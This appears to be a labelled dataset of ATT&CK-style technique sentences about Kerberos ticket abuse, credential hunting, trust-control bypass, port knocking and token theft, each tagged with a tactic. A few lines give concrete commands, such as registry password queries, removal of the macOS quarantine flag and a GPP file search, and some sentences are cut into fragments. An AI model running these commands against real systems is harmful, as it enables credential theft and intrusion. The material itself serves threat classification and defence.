The recovered encrypted data may be vulnerable to offline [Password Cracking] attacks similarly to [Kerberoasting] and expose plaintext credentials.,CREDENTIAL_ACCESS,,,
"An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell] with an LDAP filter.",CREDENTIAL_ACCESS,,,
"Alternatively, the adversary may send an AS-REQ message for each user.",CREDENTIAL_ACCESS,,,
"If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data.",CREDENTIAL_ACCESS,,,
"Cracked hashes may enable [Persistence], [Privilege Escalation], and [Lateral Movement] via access to [Valid Accounts].",CREDENTIAL_ACCESS,,,
"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.",CREDENTIAL_ACCESS,,,
"Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources.",CREDENTIAL_ACCESS,,,
Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.,CREDENTIAL_ACCESS,,,
The KDC service runs all on domain controllers that are part of an Active Directory domain.,CREDENTIAL_ACCESS,,,
KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. and privileged access to a domain controller.,CREDENTIAL_ACCESS,,,
Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force].,CREDENTIAL_ACCESS,,,
Service principal names (SPNs) are used to uniquely identify each instance of a Windows service.,CREDENTIAL_ACCESS,,,
"To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service.",CREDENTIAL_ACCESS,,,
Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).,CREDENTIAL_ACCESS,,,
This same behavior could be executed using service tickets captured from network traffic.,CREDENTIAL_ACCESS,,,
Adversaries who have the password hash of a target service account (e.g.,CREDENTIAL_ACCESS,,,
"SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.",CREDENTIAL_ACCESS,,,
Kerberos TGS tickets are also known as service tickets.,CREDENTIAL_ACCESS,,,
Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g.,CREDENTIAL_ACCESS,,,
"MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.",CREDENTIAL_ACCESS,,,
Password hashes for target services may be obtained using [OS Credential Dumping] or [Kerberoasting].,CREDENTIAL_ACCESS,,,
Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs.,DEFENSE_EVASION,,,
Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust.,DEFENSE_EVASION,,,
"Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.",DEFENSE_EVASION,,,
Adversaries may attempt to subvert these trust mechanisms.,DEFENSE_EVASION,,,
The method adversaries use will depend on the specific mechanism they seek to subvert.,DEFENSE_EVASION,,,
Adversaries may conduct [File and Directory Permissions Modification] or [Modify Registry] in support of subverting these controls.,DEFENSE_EVASION,,,
"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools.",DEFENSE_EVASION,,,
"Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. , this activity will result in a valid signature.",DEFENSE_EVASION,,,
Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems.,DEFENSE_EVASION,,,
It is not used on Linux due to the decentralized nature of the platform.,DEFENSE_EVASION,,,
Code signing certificates may be used to bypass security policies that require signed code to execute on a system.,DEFENSE_EVASION,,,
Adversaries may modify code signing policies to enable execution of unsigned or self-signed code.,DEFENSE_EVASION,,,
Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with.,DEFENSE_EVASION,,,
"Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system.",DEFENSE_EVASION,,,
"Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.",DEFENSE_EVASION,,,
"Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry], rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.",DEFENSE_EVASION,,,
"To gain access to kernel memory to modify variables related to signature checks, such as modifying g_CiOptions to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation] using a signed, but vulnerable driver.",DEFENSE_EVASION,,,
Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls in macOS.,DEFENSE_EVASION,,,
"When documents, applications, or programs are downloaded an extended attribute (xattr) called com.apple.quarantine can be set on the file by the application performing the download.",DEFENSE_EVASION,,,
"This attribute, also known as a quarantine flag, is read by Apple's Gatekeeper defense program when the file is run and provides a prompt to the user to allow or deny execution.",DEFENSE_EVASION,,,
"Gatekeeper also monitors an application's usage of dynamic libraries (dylibs) loaded outside the application folder on any quarantined binary, often using the dlopen function.",DEFENSE_EVASION,,,
"If the quarantine flag is set in macOS 10.15+, Gatekeeper also checks for a notarization ticket and sends a cryptographic hash to Apple's servers to check for validity for all unsigned executables.",DEFENSE_EVASION,,,
The quarantine flag is an opt-in system and not imposed by macOS.,DEFENSE_EVASION,,,
"If an application opts-in, a file downloaded from the Internet will be given a quarantine flag before being saved to disk.",DEFENSE_EVASION,,,
Any application or user with write permissions to the file can change or strip the quarantine flag.,DEFENSE_EVASION,,,
"With elevated permission (sudo), this attribute can be removed from any file.",DEFENSE_EVASION,,,
The presence of the com.apple.quarantine quarantine flag can be checked with the xattr command xattr -l /path/to/examplefile.,DEFENSE_EVASION,,,
"Similarly, this attribute can be recursively removed from all files in a folder using xattr, sudo xattr -d com.apple.quarantine /path/to/folder.",DEFENSE_EVASION,,,
"Apps and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command do not set this flag.",DEFENSE_EVASION,,,
"Additionally, it is possible to avoid setting this flag using [Drive-by Compromise], which may bypass Gatekeeper.",DEFENSE_EVASION,,,
Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.,DEFENSE_EVASION,,,
Root certificates are used in public key cryptography to identify a root certificate authority (CA).,DEFENSE_EVASION,,,
"When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.",DEFENSE_EVASION,,,
Certificates are commonly used for establishing secure TLS/SSL communications within a web browser.,DEFENSE_EVASION,,,
When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk.,DEFENSE_EVASION,,,
"Depending on the security settings, the browser may not allow the user to establish a connection to the website.",DEFENSE_EVASION,,,
Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system.,DEFENSE_EVASION,,,
Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.,DEFENSE_EVASION,,,
Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle] capability for intercepting information transmitted over secure TLS/SSL communications.,DEFENSE_EVASION,,,
Root certificates (and their associated chains) can also be cloned and reinstalled.,DEFENSE_EVASION,,,
"Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.",DEFENSE_EVASION,,,

"OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.",DEFENSE_EVASION,,,
Properties within parts may reference shared public resources accessed via online URLs.,DEFENSE_EVASION,,,
"For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.",DEFENSE_EVASION,,,
Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents.,DEFENSE_EVASION,,,
Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.,DEFENSE_EVASION,,,
Adversaries may also modify the *\template control word within an .rtf file to similarly conceal then download malicious code.,DEFENSE_EVASION,,,
This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened.,DEFENSE_EVASION,,,
"However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.",DEFENSE_EVASION,,,
This technique may also enable [Forced Authentication] by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.,DEFENSE_EVASION,,,
Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control.,COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task.",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control.,COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking]), but can involve unusual flags, specific strings, or other unique characteristics.",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
The observation of the signal packets to trigger the communication can be conducted through different methods.,COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question.",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"On network devices, adversaries may use crafted packets to enable [Network Device Authentication] for standard services offered by the device such as telnet.",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives. due to the monolithic nature of the architecture.",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
Adversaries may also use the Wake-on-LAN feature to turn on powered off systems.,COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it.",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"Once the system is powered on, it may become a target for lateral movement.",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
Adversaries may use port knocking to hide open ports used for persistence or command and control.,COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports.",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.",COMMAND_AND_CONTROL,DEFENSE_EVASION,,
This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.,COMMAND_AND_CONTROL,DEFENSE_EVASION,,
"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.",EXFILTRATION,,,
Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads.,DEFENSE_EVASION,,,
"There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.",DEFENSE_EVASION,,,
These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.,DEFENSE_EVASION,,,
Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility.,DEFENSE_EVASION,,,
MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio.,DEFENSE_EVASION,,,
It handles XML formatted project files that define requirements for loading and building various platforms and configurations.,DEFENSE_EVASION,,,
Adversaries can abuse MSBuild to proxy execution of malicious code.,DEFENSE_EVASION,,,
The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.,DEFENSE_EVASION,,,
Adversaries may breach or otherwise leverage organizations who have access to intended victims.,INITIAL_ACCESS,,,
Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.,INITIAL_ACCESS,,,
Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments.,INITIAL_ACCESS,,,
"Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g.",INITIAL_ACCESS,,,
"HVAC, elevators, physical security).",INITIAL_ACCESS,,,
"The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise.",INITIAL_ACCESS,,,
"As such, [Valid Accounts] used by the other party for access to internal network systems may be compromised and used.",INITIAL_ACCESS,,,
Adversaries may search compromised systems to find and obtain insecurely stored credentials.,CREDENTIAL_ACCESS,,,
"These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History]), operating system or application-specific repositories (e.g. [Credentials in Registry]), or other specialized files/artifacts (e.g. [Private Keys]).",CREDENTIAL_ACCESS,,,
Adversaries may search the bash command history on compromised systems for insecurely stored credentials.,CREDENTIAL_ACCESS,,,
"Bash keeps track of the commands users type on the command-line with the ""history"" utility.",CREDENTIAL_ACCESS,,,
"Once a user logs out, the history is flushed to the user’s .bash_history file.",CREDENTIAL_ACCESS,,,
"For each user, this file resides at the same location: ~/.bash_history.",CREDENTIAL_ACCESS,,,
"Typically, this file keeps track of the user’s last 500 commands.",CREDENTIAL_ACCESS,,,
"Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out.",CREDENTIAL_ACCESS,,,
Adversaries can abuse this by looking through the file for potential credentials.,CREDENTIAL_ACCESS,,,
Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.,CREDENTIAL_ACCESS,,,
Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance.,CREDENTIAL_ACCESS,,,
"Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets.",CREDENTIAL_ACCESS,,,
The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.,CREDENTIAL_ACCESS,,,
"If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources.",CREDENTIAL_ACCESS,,,
"Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.",CREDENTIAL_ACCESS,,,
The de facto standard across cloud service providers is to host the Instance Metadata API at http[:]//169.254.169.254.,CREDENTIAL_ACCESS,,,
Adversaries may gather credentials via APIs within a containers environment.,CREDENTIAL_ACCESS,,,
"APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.",CREDENTIAL_ACCESS,,,
"An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.",CREDENTIAL_ACCESS,,,
"An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server.",CREDENTIAL_ACCESS,,,
These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.,CREDENTIAL_ACCESS,,,
Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials.,CREDENTIAL_ACCESS,,,
"These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.",CREDENTIAL_ACCESS,,,
It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping].,CREDENTIAL_ACCESS,,,
"In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.",CREDENTIAL_ACCESS,,,
Adversaries may search the Registry on compromised systems for insecurely stored credentials.,CREDENTIAL_ACCESS,,,
The Windows Registry stores configuration information that can be used by the system or other programs.,CREDENTIAL_ACCESS,,,
Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services.,CREDENTIAL_ACCESS,,,
Sometimes these credentials are used for automatic logons.,CREDENTIAL_ACCESS,,,
"Example commands to find Registry keys related to password information: 



* Local Machine Hive: reg query HKLM /f password /t REG_SZ /s

* Current User Hive: reg query HKCU /f password /t REG_SZ /s.",CREDENTIAL_ACCESS,,,
Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP).,CREDENTIAL_ACCESS,,,
GPP are tools that allow administrators to create domain policies with embedded credentials.,CREDENTIAL_ACCESS,,,
These policies allow administrators to set local accounts.,CREDENTIAL_ACCESS,,,
These group policies are stored in SYSVOL on a domain controller.,CREDENTIAL_ACCESS,,,
This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).,CREDENTIAL_ACCESS,,,
"The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:



* Metasploit’s post exploitation module: post/windows/gather/credentials/gpp

* Get-GPPPassword

* gpprefdecrypt.py.",CREDENTIAL_ACCESS,,,
"On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: dir /s * .xml.",CREDENTIAL_ACCESS,,,
Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials.,CREDENTIAL_ACCESS,,,
"Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.",CREDENTIAL_ACCESS,,,
"Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc.",CREDENTIAL_ACCESS,,,
"Adversaries may also look in common key directories, such as ~/.ssh for SSH keys on * nix-based systems or C:&#92;Users&#92;(username)&#92;.ssh&#92; on Windows.",CREDENTIAL_ACCESS,,,
These private keys can be used to authenticate to [Remote Services] like SSH or for use in decrypting other collected files such as email.,CREDENTIAL_ACCESS,,,
Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.,CREDENTIAL_ACCESS,,,
"Some private keys require a password or passphrase for operation, so an adversary may also use [Input Capture] for keylogging or attempt to [Brute Force] the passphrase off-line.",CREDENTIAL_ACCESS,,,
Adversaries may create cloud instances in unused geographic service regions in order to evade detection.,DEFENSE_EVASION,,,
Access is usually obtained through compromising accounts used to manage cloud infrastructure.,DEFENSE_EVASION,,,
"Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements.",DEFENSE_EVASION,,,
"Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions.",DEFENSE_EVASION,,,
"If an adversary creates resources in an unused region, they may be able to operate undetected.",DEFENSE_EVASION,,,
A variation on this behavior takes advantage of differences in functionality across cloud regions.,DEFENSE_EVASION,,,
An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.,DEFENSE_EVASION,,,
"An example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking], which can cost organizations substantial amounts of money over time depending on the processing power used.",DEFENSE_EVASION,,,
"Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.).",DEFENSE_EVASION,LATERAL_MOVEMENT,,
Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s).,DEFENSE_EVASION,LATERAL_MOVEMENT,,
Alternate authentication material may also be generated during the identity creation process.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s).,DEFENSE_EVASION,LATERAL_MOVEMENT,,
Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access] techniques.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
"By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
These tokens are typically stolen from users or services and used in lieu of login credentials.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).,DEFENSE_EVASION,LATERAL_MOVEMENT,,
"In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
OAuth is one commonly implemented framework that issues tokens to users for access to systems.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
"Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
Compromised access tokens may be used as an initial step in compromising other services.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
"For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
"Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
"This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"When performing PtH, valid password hashes for the account being used are captured using a [Credential Access] technique.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
Captured hashes are used with PtH to authenticate as that user.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
"Once authenticated, PtH may be used to perform actions on local or remote systems.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"Adversaries may also use stolen password hashes to ""overpass the hash."" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
This ticket can then be used to perform [Pass the Ticket] attacks.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
"Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
Kerberos authentication can be used as the first step to lateral movement to a remote system.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
"When preforming PtT, valid Kerberos tickets for [Valid Accounts] are captured by [OS Credential Dumping].",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"A [Silver Ticket] can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"A [Golden Ticket] can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"For example, ""overpassing the hash"" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash]) while also using the password hash to create a valid Kerberos ticket.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
Adversaries can use stolen session cookies to authenticate to web applications and services.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
This technique bypasses some multi-factor authentication protocols since the session is already authenticated.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
"Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"Cookies are often valid for an extended period of time, even if the web application is not actively used.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"After the cookie is obtained through [Steal Web Session Cookie] or [Web Cookies], the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
"Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.",DEFENSE_EVASION,LATERAL_MOVEMENT,,
There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.,DEFENSE_EVASION,LATERAL_MOVEMENT,,
An adversary may rely upon specific actions by a user in order to gain execution.,EXECUTION,,,
"Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link.",EXECUTION,,,
These user actions will typically be observed as follow-on behavior from forms of [Phishing].,EXECUTION,,,
"While [User Execution] frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.",EXECUTION,,,
This activity may also be seen shortly after [Internal Spearphishing].,EXECUTION,,,
"Adversaries may also deceive users into performing actions such as enabling [Remote Access Software], allowing direct control of the system to the adversary, or downloading and executing malware for [User Execution].",EXECUTION,,,

An adversary may rely upon a user opening a malicious file in order to gain execution.,EXECUTION,,,
Users may be subjected to social engineering to get them to open a file that will lead to code execution.,EXECUTION,,,
This user action will typically be observed as follow-on behavior from [Spearphishing Attachment].,EXECUTION,,,
Adversaries may employ various forms of [Masquerading] and [Obfuscated Files or Information] to increase the likelihood that a user will open and successfully execute a malicious file.,EXECUTION,,,
These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.,EXECUTION,,,
"While [Malicious File] frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.",EXECUTION,,,
Adversaries may rely on a user running a malicious image to facilitate execution.,EXECUTION,,,
"Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored.",EXECUTION,,,
"Backdoored images may be uploaded to a public repository via [Upload Malware], and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access.",EXECUTION,,,
"This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.",EXECUTION,,,
Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location]).,EXECUTION,,,
An adversary may rely upon a user clicking a malicious link in order to gain execution.,EXECUTION,,,
Users may be subjected to social engineering to get them to click on a link that will lead to code execution.,EXECUTION,,,
This user action will typically be observed as follow-on behavior from [Spearphishing Link].,EXECUTION,,,
Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution].,EXECUTION,,,
Links may also lead users to download files that require execution via [Malicious File].,EXECUTION,,,
"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",DEFENSE_EVASION,INITIAL_ACCESS,,
"Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",DEFENSE_EVASION,INITIAL_ACCESS,,
Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network.,DEFENSE_EVASION,INITIAL_ACCESS,,
Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.,DEFENSE_EVASION,INITIAL_ACCESS,,
"In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization.",DEFENSE_EVASION,INITIAL_ACCESS,,
"Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.",DEFENSE_EVASION,INITIAL_ACCESS,,
"The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.",DEFENSE_EVASION,INITIAL_ACCESS,,
"Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",DEFENSE_EVASION,INITIAL_ACCESS,,
"Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.",DEFENSE_EVASION,INITIAL_ACCESS,,
"In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory.",DEFENSE_EVASION,INITIAL_ACCESS,,
Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases.,DEFENSE_EVASION,INITIAL_ACCESS,,
Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a [Trusted Relationship].,DEFENSE_EVASION,INITIAL_ACCESS,,
